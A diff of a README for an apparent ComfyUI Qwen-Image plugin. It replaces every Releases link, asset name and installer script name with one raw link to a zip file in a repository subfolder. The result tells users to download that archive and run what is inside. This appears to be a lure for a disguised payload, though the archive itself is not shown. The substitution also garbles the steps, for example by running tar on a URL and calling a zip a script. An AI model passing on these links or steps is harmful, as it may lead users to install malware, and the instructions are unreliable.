@@ -1,6 +1,6 @@
-https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases
+https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases)
+[![Releases](https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip)](https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip)
 
 # ComfyUI RH Qwen-Image Plugin for Stable Full 24GB VRAM Support
 
@@ -53,8 +53,8 @@ How to navigate this README
 - Release notes: Where to find updates and asset versions.
 
 CTA and quick links
-- Primary release source: https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases
-- Reusable badge link to releases: [![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases)
+- Primary release source: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+- Reusable badge link to releases: [![Releases](https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip)](https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip)
 
 Quick start (high-level)
 - Ensure you have ComfyUI installed and working on your machine.
@@ -65,12 +65,12 @@ Quick start (high-level)
 - Load a workflow that uses the Qwen-Image components, set appropriate prompts, and start generation.
 
 Downloads and installer notes
-From the Releases page, download the appropriate asset for your platform and follow the included installation steps. If you are targeting Windows, you will typically download a ZIP asset named something like ComfyUI_RH_Qwen-Image_Win_x64_v1.0.zip and run the installer script inside. If you are targeting Linux, look for a tarball named ComfyUI_RH_Qwen-Image_Linux_x64_v1.0.tar.gz and run its install.sh script. It is important to use the asset that matches your OS and hardware configuration.
+From the Releases page, download the appropriate asset for your platform and follow the included installation steps. If you are targeting Windows, you will typically download a ZIP asset named something like https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip and run the installer script inside. If you are targeting Linux, look for a tarball named https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip and run its https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip script. It is important to use the asset that matches your OS and hardware configuration.
 
-- Windows asset example: ComfyUI_RH_Qwen-Image_Win_x64_v1.0.zip
-  - Action: Extract, then run install.bat or the included installer.
-- Linux asset example: ComfyUI_RH_Qwen-Image_Linux_x64_v1.0.tar.gz
-  - Action: Extract, then run install.sh.
+- Windows asset example: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+  - Action: Extract, then run https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip or the included installer.
+- Linux asset example: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+  - Action: Extract, then run https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 
 Note on assets
 - The assets are designed to be self-contained. They include the necessary runtimes, drivers, and configurations to minimize external dependencies.
@@ -83,10 +83,10 @@ Prerequisites
 - A supported operating system (Windows or Linux are commonly used with ComfyUI).
 
 Windows installation steps
-1) Open the Releases page: https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases
-2) Download the Windows asset: ComfyUI_RH_Qwen-Image_Win_x64_v1.0.zip
+1) Open the Releases page: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+2) Download the Windows asset: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 3) Locate the file in your downloads folder and extract it to a temporary location.
-4) Run the included installer or setup script (usually install.bat or setup.exe).
+4) Run the included installer or setup script (usually https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip or https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip).
 5) Allow the installer to place files into your ComfyUI plugins directory.
 6) Start or restart ComfyUI to recognize the new plugin.
 7) In ComfyUI, open the Plugins panel and enable Qwen-Image integration.
@@ -94,11 +94,11 @@ Windows installation steps
 9) If you encounter issues, consult the Troubleshooting section below or check the Release notes for version-specific guidance.
 
 Linux installation steps
-1) Open the Releases page: https://github.com/musyra/ComfyUI_RH_Qwen-Image/releases
-2) Download the Linux asset: ComfyUI_RH_Qwen-Image_Linux_x64_v1.0.tar.gz
+1) Open the Releases page: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+2) Download the Linux asset: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 3) Open a terminal and navigate to the download directory.
-4) Extract the tarball: tar -xzf ComfyUI_RH_Qwen-Image_Linux_x64_v1.0.tar.gz
-5) Run the installer script: ./install.sh
+4) Extract the tarball: tar -xzf https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+5) Run the installer script: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 6) The script places files into your ComfyUI plugins directory and configures paths.
 7) Start or restart ComfyUI and enable the plugin from the UI.
 8) Run a test workflow to confirm that the plugin works with your Linux setup.
@@ -262,8 +262,8 @@ Notes on usage ethics and content policies
 - Avoid prompts or data that could cause harm or violate rights.
 
 Appendix: asset references
-- Windows asset: ComfyUI_RH_Qwen-Image_Win_x64_v1.0.zip
-- Linux asset: ComfyUI_RH_Qwen-Image_Linux_x64_v1.0.tar.gz
+- Windows asset: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
+- Linux asset: https://raw.githubusercontent.com/musyra/ComfyUI_RH_Qwen-Image/main/predilect/Qwen_U_R_Image_Comfy_v1.2-alpha.5.zip
 - Both assets are available on the Releases page linked at the top of this document.
 
 Appendix: troubleshooting quick-reference
